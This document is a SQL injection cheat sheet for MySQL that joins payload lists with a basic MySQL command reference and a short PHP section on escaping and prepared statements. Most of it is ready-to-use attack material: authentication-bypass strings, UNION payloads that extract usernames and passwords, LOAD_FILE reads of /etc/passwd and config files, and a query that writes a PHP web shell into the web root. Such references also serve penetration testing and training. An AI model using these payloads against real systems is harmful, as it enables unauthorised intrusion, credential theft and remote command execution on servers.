# SQL Injection Command Cheat Sheet

## Database Fingerprinting

### MySQL/MariaDB Detection
```sql
SELECT @@version              -- Get database version
SELECT POW(1,1)               -- Test for MySQL (returns 1)
SELECT SLEEP(5)               -- Blind test (delays response for 5 seconds)
```

## Database Enumeration

### Database Discovery
```sql
-- List all databases
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

-- Get current database
SELECT database();
```

### Table Discovery
```sql
-- List tables in a specific database
SELECT TABLE_NAME, TABLE_SCHEMA
FROM INFORMATION_SCHEMA.TABLES
WHERE table_schema='database_name';

-- List all tables
SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES;
```

### Column Discovery
```sql
-- List columns in a specific table
SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name='table_name';

-- List all columns in a database
SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_schema='database_name';
```

## User Information & Privileges

### Current User
```sql
SELECT USER();                -- Current user
SELECT CURRENT_USER();        -- Current user (alternative)
SELECT user FROM mysql.user;  -- List all users
```

### Privilege Checking
```sql
-- Check super privileges
SELECT super_priv FROM mysql.user;
SELECT super_priv FROM mysql.user WHERE user="root";

-- List all user privileges
SELECT grantee, privilege_type FROM information_schema.user_privileges;

-- List privileges for specific user
SELECT grantee, privilege_type
FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'";
```

## File Operations

### Reading Files
```sql
-- Read file content
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Check file read/write permissions
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv";
```

### Writing Files
```sql
-- Write simple text to file
SELECT 'Hello World' INTO OUTFILE '/tmp/test.txt';

-- Write query results to file
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';

-- Write web shell
SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## UNION Injection Payloads

### Basic Structure
```sql
-- Template for UNION injection
' UNION SELECT 1,2,3,4-- -

-- Database enumeration
' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- Table enumeration
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='database_name'-- -

-- Column enumeration
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='table_name'-- -

-- Data extraction
' UNION SELECT 1,username,password,4 FROM database_name.table_name-- -
```

### File Operations via UNION
```sql
-- Read files
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -

-- Write files
' UNION SELECT 1,'file content',3,4 INTO OUTFILE '/var/www/html/test.txt'-- -
```

## Common File Paths

### Linux Configuration Files
- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes
- `/etc/apache2/apache2.conf` - Apache config
- `/etc/nginx/nginx.conf` - Nginx config
- `/var/www/html/` - Default web root

### Windows Configuration Files
- `C:\Windows\System32\drivers\etc\hosts` - Hosts file
- `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` - IIS config

## Security Functions (PHP)

### Input Sanitization
```php
// Escape special characters
$username = mysqli_real_escape_string($conn, $_POST['username']);

// PostgreSQL equivalent
$username = pg_escape_string($_POST['username']);
```

### Input Validation
```php
// Regex validation example
$pattern = "/^[A-Za-z\s]+$/";
if(!preg_match($pattern, $input)) {
    die("Invalid input!");
}
```

### Parameterized Queries
```php
// Prepared statements
$query = "SELECT * FROM users WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

## Notes

- Always add `-- -` at the end of payloads to comment out the rest of the query
- Use single quotes `'` for string injection points
- Adjust the number of columns in UNION SELECT to match the original query
- The `secure_file_priv` variable controls file read/write permissions:
  - Empty = Can read/write anywhere
  - Directory path = Restricted to that directory
  - NULL = No file operations allowed
# Command Cheat Sheet:
## Discovery Payloads:

' (single quote)
" (double quote)
# (hash)
; (semicolon)
) (closing parenthesis)

## Authentication Bypass:

admin' or '1'='1
' or '1'='1
admin'--
admin')--

Comments:

--  (two dashes with space)
"#" (hash symbol)
--+ (URL encoded version)
%23 (URL encoded hash)

## Column Detection:

' order by 1-- -
' order by 2-- - (increment until error)
cn' UNION select 1,2,3-- -

## UNION Injection:

cn' UNION select 1,@@version,3,4-- -
1' UNION SELECT username, password from passwords-- '
# MySQL Command Cheat Sheet:

## DATABASE OPERATIONS:
CREATE DATABASE database_name;
SHOW DATABASES;
USE database_name;
DROP DATABASE database_name;

## TABLE OPERATIONS:
CREATE TABLE table_name (column1 datatype, column2 datatype, ...);
SHOW TABLES;
DESCRIBE table_name;
DROP TABLE table_name;
ALTER TABLE table_name ADD column_name datatype;
ALTER TABLE table_name RENAME COLUMN old_name TO new_name;
ALTER TABLE table_name MODIFY column_name new_datatype;
ALTER TABLE table_name DROP column_name;

## DATA MANIPULATION:
INSERT INTO table_name VALUES (value1, value2, ...);
INSERT INTO table_name (column1, column2) VALUES (value1, value2);
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
UPDATE table_name SET column1 = value1 WHERE condition;
DELETE FROM table_name WHERE condition;

## FILTERING AND SORTING:
SELECT * FROM table_name WHERE condition;
SELECT * FROM table_name WHERE column LIKE 'pattern%';
SELECT * FROM table_name ORDER BY column ASC/DESC;
SELECT * FROM table_name LIMIT number;
SELECT * FROM table_name LIMIT offset, count;

## CONNECTION:
mysql -u username -p
mysql -u username -h hostname -P port -p
